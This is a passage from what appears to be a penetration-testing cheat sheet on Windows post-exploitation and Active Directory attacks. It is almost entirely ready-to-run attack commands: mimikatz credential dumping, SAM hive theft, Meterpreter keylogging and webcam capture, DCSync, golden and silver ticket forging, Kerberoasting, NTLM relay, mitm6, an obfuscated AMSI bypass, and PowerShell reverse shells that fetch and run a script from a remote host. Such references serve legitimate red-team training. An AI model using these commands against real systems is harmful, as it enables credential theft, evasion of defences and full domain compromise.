sekurlsa::logonpasswords
#or
privilege::debug
lsadump::lsa /patch

# WDigest
privilege::debug
sekurlsa::wdigest
</code></pre>
<h2 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h2>
<pre><code># Check groups and privs
whoami /priv

# Interesting accounts

- Administrators, Local System
- Built-in groups (Backup, Server, Printer Operators)
- Local/network service accounts
- Managed Service and Virtual Accounts
- Third party application users
- Misconfigured users

# Interesting privileges

- SeDebugPrivilege
Create a new process and set the parent process a privileged process
https://github.com/decoder-it/psgetsystem
- SeRestorePrivilege
Can write files anywhere, overwrites files, protected system files
Modify a service running as Local and startable by all users and get a SYSTEM shell
- SeBackupPrivilege
Can backup Windows registry and use third party tools for extracting local NTLM hashes
Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT
- SeTakeOwnershipPrivilege
Can take ownership of any securable object in the system
- SeTcbPrivilege
Can logon as a different user without any credentials in order to get a security Impersonation Token by using the LsaLogonUser() function
- SeCreateTokenPrivilege
Can create a custom token with all privileges and group membership you need (until Win 10 &gt;= 1809)
But if you set the AuthenticationId to ANONYMOUS_LOGON_UID (0x3e6) you can always impersonate even in Win &gt;=1809 and use a subset of API calls: CreateFile(), RegSetKey()
- SeLoadDriver Privilege
"Printer operators" have this privilege in the DC
Determines which users can dynamically load and unload device drivers or other code in to kernel mode
- SeImpersonatePrivilege &amp; SeAssignPrimaryTokenPrivilege
Permit impersonate any access token

** If you have SeBackup &amp; SeRestore privileges (Backup Operators group) you can set permission and ownership on each file &amp; folder **
</code></pre>
<h2 id="loot-1"><a class="header" href="#loot-1">Loot</a></h2>
<pre><code class="language-bash">hostname &amp;&amp; whoami.exe &amp;&amp; ipconfig /all
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

ipconfig /all
route print

# What other machines have been connected
arp -a

# Meterpreter
run packetrecorder -li
run packetrecorder -i 1

#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap
load mimikatz
msv

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s

secretsdump.py -just-dc htb.hostname/username@10.10.1.10 &gt; dump.txt
.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"

# Mimikatz
# Post exploitation commands must be executed from SYSTEM level privileges.
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords
## Pass The Hash
mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
# Inject generated TGS key
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
# Generating a silver ticket 
# AES 256 Key:
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;
# AES 128 Key:
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;
# NTLM
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;
# Generating a Golden Ticket
# AES 256 Key:
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;
# AES 128 Key: 
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;
# NTLM:
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;

# Lsassy (remote lsass/mimikatz dump reader) (requires impacket)
git clone https://github.com/hackndo/lsassy
cd lsassy &amp;&amp; sudo python3 setup.py install
lsassy example.com/Administrator:s3cr3tpassw0rd@victim-pc

# Lsass dump 
https://github.com/outflanknl/Dumpert
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ad"><a class="header" href="#ad">AD</a></h1>
<h2 id="info-4"><a class="header" href="#info-4">Info</a></h2>
<h3 id="basic-active-directory-terms"><a class="header" href="#basic-active-directory-terms">Basic Active Directory terms</a></h3>
<h4 id="users"><a class="header" href="#users">Users</a></h4>
<p>Agent represented by a user account.</p>
<ul>
<li>Regular user accounts (used by employees or for specific task as backups)</li>
<li>Computer accounts (ends with $). Computers in AD are a users subclass.</li>
</ul>
<h4 id="services-1"><a class="header" href="#services-1">Services</a></h4>
<ul>
<li>Identified by SPN which indicates the service name and class, the owner and the host computer.</li>
<li>Is executed in a computer (the host of the service) as a process.</li>
<li>Services (as any process) are running in the context of a user account, with the privileges and permissions of that user.</li>
<li> The SPN’s of the services owned by an user are stored in the attribute ServicePrincipalName of that account.</li>
<li>Usually Domain Admin or similar role is required to modify the SPN’s of a user.</li>
</ul>
<h2 id="general-7"><a class="header" href="#general-7">General</a></h2>
<pre><code class="language-bash"># Anonymous Credential LDAP Dumping:
ldapsearch -LLL -x -H ldap:// -b ‘’ -s base ‘(objectclass=*)’

# Impacket GetADUsers.py (Must have valid credentials)
GetADUsers.py -all  -dc-ip 

# Impacket lookupsid.py
/usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

# Windapsearch:
# https://github.com/ropnop/windapsearch 
python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
# Go version https://github.com/ropnop/go-windapsearch

# CME
cme smb IP -u '' -p '' --users --shares

# BloodHound
# https://github.com/BloodHoundAD/BloodHound/releases
# https://github.com/BloodHoundAD/SharpHound3
# https://github.com/chryzsh/DarthSidious/blob/master/enumeration/bloodhound.md
Import-Module .\sharphound.ps1
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password
# Bloodhound.py (no shell needed) remote, ldap auth
https://github.com/fox-it/BloodHound.py
bloodhound-python -u &lt;user&gt; -p '&lt;password&gt;' -ns &lt;dc.ip&gt; -d &lt;domain.name&gt; -c all

# BloodHound Cheatsheet
# https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

# Bloodhound raw queries
# https://github.com/xenoscr/Useful-BloodHound-Queries

# Bloodhound complements
# https://github.com/RastreatorTeam/rastreator
# https://github.com/kaluche/bloodhound-quickwin
# https://github.com/knavesec/Max
# https://github.com/improsec/ImproHound
# https://github.com/fox-it/aclpwn.py

# Get BH data from LDAP
https://github.com/c3c/ADExplorerSnapshot.py

# Rubeus
# https://github.com/GhostPack/Rubeus
## ASREProasting:
Rubeus.exe asreproast  /format:&lt;AS_REP_responses_format [hashcat | john]&gt; /outfile:&lt;output_hashes_file&gt;
## Kerberoasting:
Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;
Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 
## Pass the key (PTK):
.\Rubeus.exe asktgt /domain:&lt;domain_name&gt; /user:&lt;user_name&gt; /rc4:&lt;ntlm_hash&gt; /ptt
# Using the ticket on a Windows target: 
Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;

# Password Spraying tool
https://github.com/dafthack/DomainPasswordSpray

# Kerberoast
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

# Powerview
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
    Find-InterestingDomainShareFile
    –CheckAccess

# AD Cheatsheets
https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet

#  References: 
https://wadcoms.github.io/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise
https://github.com/infosecn1nja/AD-Attack-Defense
https://adsecurity.org/?page_id=1821 
https://github.com/sense-of-security/ADRecon
https://adsecurity.org/?p=15
https://adsecurity.org/?cat=7
https://adsecurity.org/?page_id=4031
https://www.fuzzysecurity.com/tutorials/16.html
https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/
http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain
https://adsecurity.org/?p=1588
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://www.harmj0y.net/blog/tag/powerview/
https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
https://github.com/dievus/Oh365UserFinder
https://o365blog.com/aadinternals/
</code></pre>
<h2 id="common-vulns"><a class="header" href="#common-vulns">Common vulns</a></h2>
<pre><code class="language-bash"># Users having rights to add computers to domain
add-computer –domainname org.local -Credential ORG\john -restart –force

# AdminCount attribute set on common users
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
Import-Module ActiveDirectory
Get-AdObject -ldapfilter "(admincount=1)" -properties admincount

# High number of users in privileged groups
net group "Schema Admins" /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
runas /netonly /user:&lt;DOMAIN&gt;\&lt;USER&gt; cmd.exe
 - Linux:
net rpc group members 'Schema Admins' -I &lt;DC-IP&gt; -U "&lt;USER&gt;"%"&lt;PASS&gt;"
net rpc group members 'Domain Admins' -I &lt;DC-IP&gt; -U "&lt;USER&gt;"%"&lt;PASS&gt;"
net rpc group members 'Enterprise Admins' -I &lt;DC-IP&gt; -U "&lt;USER&gt;"%"&lt;PASS&gt;"
net rpc group members 'Domain Admins' -I 10.10.30.52 -U "john"%"pass123"

# Service accounts being members of Domain Admins
net group "Schema Admins" /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Excessive privileges allowing for shadow Domain Admins
Bloodhound/Sharphound

# Service accounts vulnerable to Kerberoasting
GetUserSPNs.py -request example.com/john:pass123
hashcat -m 13100 -a 0 -O --self-test-disable hashes.txt wordlist.txt

# Users with non-expiring passwords
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
grep DONT_EXPIRE_PASSWD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'
 - PS
Import-Module ActiveDirectory
Get-ADUser -filter * -properties Name, PasswordNeverExpires | where { $_.passwordNeverExpires -eq "true" } | where {$_.enabled -eq "true" }

# Users with password not required
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'
 - PS
Import-Module ActiveDirectory
Get-ADUser -Filter {UserAccountControl -band 0x0020}

# Storing passwords using reversible encryption
mimikatz # lsadump::dcsync /domain:example.com /user:poorjohn

# Storing passwords using LM hashes
- In NTDS.dit
grep -iv ':aad3b435b51404eeaad3b435b51404ee:' dumped_hashes.txt

# Service accounts vulnerable to AS-REP roasting
GetNPUsers.py example.com/ -usersfile userlist.txt -format hashcat -no-pass
GetNPUsers.py example.com/john:pass123 -request -format hashcat
hashcat -m 18200 -a 0 -O --self-test-disable hashes.txt wordlist.txt
 - PS
Import-Module ActiveDirectory
Get-ADuser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name

# Weak domain password policy
net accounts /domain
polenum --username john --password pass123 --domain 10.10.51.11
enum4linux -P -u john -p pass123 -w dom.local 172.21.1.60

# Inactive domain accounts
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
sort -t ';' -k 8 domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3, $8}'

# Privileged users with password reset overdue
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json &gt; privileged_users.txt

while read user; do grep ";${user};" domain_users.grep; done &lt; privileged_users.txt | \
  grep -v ACCOUNT_DISABLED | sort -t ';' -k 10 | awk -F ';' '{print $3, $10}'
  
# Users with a weak password
$a = [adsisearcher]”(&amp;(objectCategory=person)(objectClass=user))”
$a.PropertiesToLoad.add(“samaccountname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.samaccountname } &gt; users.txt

Import-Module ./adlogin.ps1
adlogin users.txt domain.com password123

# Credentials in SYSVOL and Group Policy Preferences (GPP)
findstr /s /n /i /p password \\example.com\sysvol\example.com\*
mount.cifs -o domain=example.com,username=john,password="pass@123" //10.10.139.115/SYSVOL /mnt
grep -ir 'password' /mnt
</code></pre>
<h2 id="quick-tips"><a class="header" href="#quick-tips">Quick tips</a></h2>
<pre><code class="language-bash"># Amsi bypass
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# Powershell Execution policy Bypass
powershell -ep bypass

# To input the output of the first command into second command use this powershell technique
# %{} is an alias for ForEach-Object{}
# ?{} is an alias for Where-Object{}
# $_ is variable
&lt;First command&gt; | %{&lt;Second command&gt; -&lt;argument&gt; $_}

# To filter out an object type we can use this technique with pipe.
?{$_.&lt;object&gt; -eq '&lt;value&gt;’'}

# Find local admin access
Find-LocalAdminAccess

# Get Domain sid
Get-DomainSID
Arguments -Domain “domain name”

# Get DC
Get-NetDomainController
Arguments -Domain “domain name”

# Get users in current domain
Get-NetUser
Arguments -UserName “username”

# Get user properties
Get-UserProperty
Arguments -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm ”built”

# Get all computers
Get-NetComputer -FullData
Many arguments -OperatingSystem -Ping -FullData

# Get groups
Get-NetGroup
Arguments -FullData -Domain

# Get members of a particular group
Get-NetGroupMember -GroupName "Domain Admins"

# Group Policies
Get-NetGPO Get-NetGPO -ComputerName Get-NetGPOGroup

# Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName

# Get OUs
Get-NetOU -FullData Get-NetGPO -GPOname

# Mapping forest
Get-NetForest -Verbose
Get-NetForestDomain -Verbose

# Mapping trust
Get-NetDomainTrust
Arguments -Domain
Get-NetForestDomain -Verbose | Get-NetDomainTrust

# Finding Constrained Delegation
Get-DomainUser -TrustedToAuth (Poweview Dev.)

# Finding UnConstrained Delegation
Get-NetComputer -UnConstrained

# Get ACLs
Get-ObjectAcl -SamAccountName -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Reverse Shell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.113 -Port 443

#Mimikatz
# Make ntlm ps-session
Invoke-Mimikatz -Command '"sekurlsa::pth /user: /domain: /ntlm: /run:powershell.exe"'

# Dump creds
Invoke-Mimikatz
Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’
Invoke-Mimikatz -Command '"lsadump::dcsync /user:\krbtgt"'
(dcsync requires 3 permission )

# Tickets
Inject ticket:-
Invoke-Mimikatz -Command '"kerberos::ptt &lt;location of .kirbi tkt&gt;"'
Export Tickets:-
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Golden tkt
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:&lt;krbtgt hash&gt; id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Silver tkt
Invoke-Mimikatz -Command '"kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;target&gt; /service:&lt;ServiceType&gt; /rc4:&lt;rc4 NTLM Hash of user&gt; /user:&lt;UserToImpersonate&gt; /ptt"'

# TGT tkt
kekeo.exe tgt::ask /user:&lt;user name&gt; /domain:&lt;domain name&gt; /rc4:&lt;rc4 NTLM Hash of user&gt;

# TGS tkt
Kekeo.exe
tgs::s4u /tgt:tgt_ticket.kirbi /user:&lt;user&gt;@&lt;domain&gt; /service:&lt;service name&gt;/&lt;server name&gt;
</code></pre>
<h2 id="relay-attacks-flow"><a class="header" href="#relay-attacks-flow">Relay attacks flow</a></h2>
<p>https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022</p>
<h3 id="scan"><a class="header" href="#scan">Scan</a></h3>
<pre><code class="language-bash"># First just listen
sudo responder -I eth0 -A

# Check SMB signing disabled
crackmapexec smb 10.10.10.0/24 --gen-relay-list smb_sign_disabled.txt
</code></pre>
<h3 id="basic-attack-a"><a class="header" href="#basic-attack-a">Basic attack A</a></h3>
<pre><code class="language-bash"># Modify responder.cfg to disable HTTP and SMB servers
# Start ntmlrelay.py against smb_sign_disabled.txt hosts list
ntlmrelayx.py -tf smb_sign_disabled.txt
# Then start responder in attack mode
responder -rdP -I eth0 

# Cracking NTLMv2
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
</code></pre>
<h3 id="basic-attack-b-socks-proxy"><a class="header" href="#basic-attack-b-socks-proxy">Basic attack B (socks proxy)</a></h3>
<pre><code># Modify responder.cfg to disable HTTP and SMB servers
# Start ntmlrelay.py against smb_sign_disabled.txt hosts list
ntlmrelayx.py -tf smb_sign_disabled.txt -smb2support -socks
# Edit proxychains4.conf to:
socks4 127.0.0.1 1080
# Run secretsdump 
proxychains secretsdump.py dcname\user:password@10.10.10.X
# Even smbclient
proxychains smbclient.py dcname\user:password@10.10.10.X
</code></pre>
<h3 id="ldap-enum"><a class="header" href="#ldap-enum">LDAP Enum</a></h3>
<pre><code>ntlmrelayx.py -t ldap://10.10.10.10 -smb2support
</code></pre>
<h2 id="ipv6-dns-takeover-via-mitm6"><a class="header" href="#ipv6-dns-takeover-via-mitm6">IPv6 DNS Takeover via Mitm6</a></h2>
<pre><code class="language-bash">git clone https://github.com/fox-it/mitm6.git 
pip install mitm6 
mitm6 -d domain.name
# During before step, in other terminal run
ntlmrelayx.py -6 -t ldaps://192.168.176.129 -wh fakewpadhost.domain.name -l dir
</code></pre>
<h2 id="ldap-complete-guide"><a class="header" href="#ldap-complete-guide">LDAP complete guide</a></h2>
<p>https://malicious.link/post/2022/ldapsearch-reference/</p>
<h2 id="ad-mindmap"><a class="header" href="#ad-mindmap">AD Mindmap</a></h2>
<p>https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
<a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p>
<p>https://t.co/hE0VKO5b2I?amp=1</p>
<p>https://www.xmind.net/m/5dypm8/</p>
<h2 id="dacl-mindmap"><a class="header" href="#dacl-mindmap">DACL mindmap</a></h2>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/image%20(9).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="kerberos"><a class="header" href="#kerberos">Kerberos</a></h1>
<h2 id="info-5"><a class="header" href="#info-5">Info</a></h2>
<h3 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(12).png" alt="" /></p>
<h3 id="step-1"><a class="header" href="#step-1">Step 1</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(7).png" alt="" /></p>
<h3 id="step-2"><a class="header" href="#step-2">Step 2</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(1).png" alt="" /></p>
<h3 id="step-3"><a class="header" href="#step-3">Step 3</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(16).png" alt="" /></p>
<h3 id="step-4"><a class="header" href="#step-4">Step 4</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(19).png" alt="" /></p>
<h3 id="step-5"><a class="header" href="#step-5">Step 5</a></h3>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(8).png" alt="" /></p>
<h2 id="bruteforcing-1"><a class="header" href="#bruteforcing-1">Bruteforcing</a></h2>
<blockquote>
<p>Requirements: connection with DC/KDC.</p>
</blockquote>
<h3 id="linux-external"><a class="header" href="#linux-external">Linux (external)</a></h3>
<p>With <a href="https://github.com/TarlogicSecurity/kerbrute">kerbrute.py</a>:</p>
<pre><code>python kerbrute.py -domain &lt;domain_name&gt; -users &lt;users_file&gt; -passwords &lt;passwords_file&gt; -outputfile &lt;output_file&gt;
</code></pre>
<h3 id="windows-internal"><a class="header" href="#windows-internal">Windows (internal)</a></h3>
<p>With <a href="https://github.com/Zer1t0/Rubeus">Rubeus</a> version with brute module:</p>
<pre><code># with a list of users
.\Rubeus.exe brute /users:&lt;users_file&gt; /passwords:&lt;passwords_file&gt; /domain:&lt;domain_name&gt; /outfile:&lt;output_file&gt;

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:&lt;passwords_file&gt; /outfile:&lt;output_file&gt;
</code></pre>
<h2 id="asreproast"><a class="header" href="#asreproast">ASREPRoast</a></h2>
<blockquote>
<p>Cracking users password, with KRB_AS_REQ when user has DONT_REQ_PREAUTH attribute, KDC respond with KRB_AS_REP user hash and then go for cracking.</p>
</blockquote>
<pre><code># LDAP filter for non preauth krb users
LDAP: (&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
</code></pre>
<h3 id="linux-external-1"><a class="header" href="#linux-external-1">Linux (external)</a></h3>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> example GetNPUsers.py:</p>
<pre><code># check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
</code></pre>
<h3 id="windows-internal-1"><a class="header" href="#windows-internal-1">Windows (internal)</a></h3>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code># check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:&lt;AS_REP_responses_format [hashcat | john]&gt; /outfile:&lt;output_hashes_file&gt;

# Powerview
Get-DomainUser -PreauthNotRequired

# https://github.com/HarmJ0y/ASREPRoast
</code></pre>
<p>Cracking with dictionary of passwords:</p>
<pre><code>hashcat -m 18200 -a 0 &lt;AS_REP_responses_file&gt; &lt;passwords_file&gt;

john --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
</code></pre>
<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
<blockquote>
<p>Cracking users password from TGS, because TGS requires Service key which is derived from NTLM hash</p>
</blockquote>
<pre><code># LDAP filter for users with linked services
LDAP: (&amp;(samAccountType=805306368)(servicePrincipalName=*))
</code></pre>
<h3 id="linux-external-2"><a class="header" href="#linux-external-2">Linux (external)</a></h3>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> example GetUserSPNs.py:</p>
<pre><code>python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt;
</code></pre>
<h3 id="windows-internal-2"><a class="header" href="#windows-internal-2">Windows (internal)</a></h3>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code>.\Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;
</code></pre>
<p>With <strong>Powershell</strong>:</p>
<pre><code>iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat &lt;TGSs_format [hashcat | john]&gt; | % { $_.Hash } | Out-File -Encoding ASCII &lt;output_TGSs_file&gt;
</code></pre>
<p>Cracking with dictionary of passwords:</p>
<pre><code>hashcat -m 13100 --force &lt;TGSs_file&gt; &lt;passwords_file&gt;

john --format=krb5tgs --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
</code></pre>
<h2 id="overpass-the-hashpass-the-key-ptk"><a class="header" href="#overpass-the-hashpass-the-key-ptk">Overpass The Hash/Pass The Key (PTK)</a></h2>
<blockquote>
<p>NTDS.DIT, SAM files or lsass with mimi</p>
</blockquote>
<h3 id="linux-external-3"><a class="header" href="#linux-external-3">Linux (external)</a></h3>
<p>By using <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code># Request the TGT with hash
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
# Request the TGT with password
python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=&lt;TGT_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="windows-internal-3"><a class="header" href="#windows-internal-3">Windows (internal)</a></h3>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code># Ask and inject the ticket
.\Rubeus.exe asktgt /domain:&lt;domain_name&gt; /user:&lt;user_name&gt; /rc4:&lt;ntlm_hash&gt; /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass The Ticket (PTT)</a></h2>
<blockquote>
<p>MiTM, lsass with mimi </p>
</blockquote>
<h3 id="linux-external-4"><a class="header" href="#linux-external-4">Linux (external)</a></h3>
<p>Check type and location of tickets:</p>
<pre><code>grep default_ccache_name /etc/krb5.conf
</code></pre>
<p>If none return, default is FILE:/tmp/krb5cc_%{uid}.</p>
<p>In case of file tickets, you can copy-paste (if you have permissions) for use them.</p>
<p>In case of being <em>KEYRING</em> tickets, you can use <a href="https://github.com/TarlogicSecurity/tickey">tickey</a> to get them:</p>
<pre><code># To dump current user tickets, if root, try to dump them all by injecting in other user processes
# to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
</code></pre>
<h3 id="windows-internal-4"><a class="header" href="#windows-internal-4">Windows (internal)</a></h3>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code>mimikatz # sekurlsa::tickets /export
</code></pre>
<p>With <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> in Powershell:</p>
<pre><code>.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;bas64_ticket&gt;"))
</code></pre>
<p>To convert tickets between Linux/Windows format with <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter.py</a>:</p>
<pre><code># ccache (Linux), kirbi (Windows from mimi/Rubeus) 
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
</code></pre>
<h3 id="using-ticket-in-linux"><a class="header" href="#using-ticket-in-linux">Using ticket in Linux</a></h3>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code># Set the ticket for impacket use
export KRB5CCNAME=&lt;TGT_ccache_file_path&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
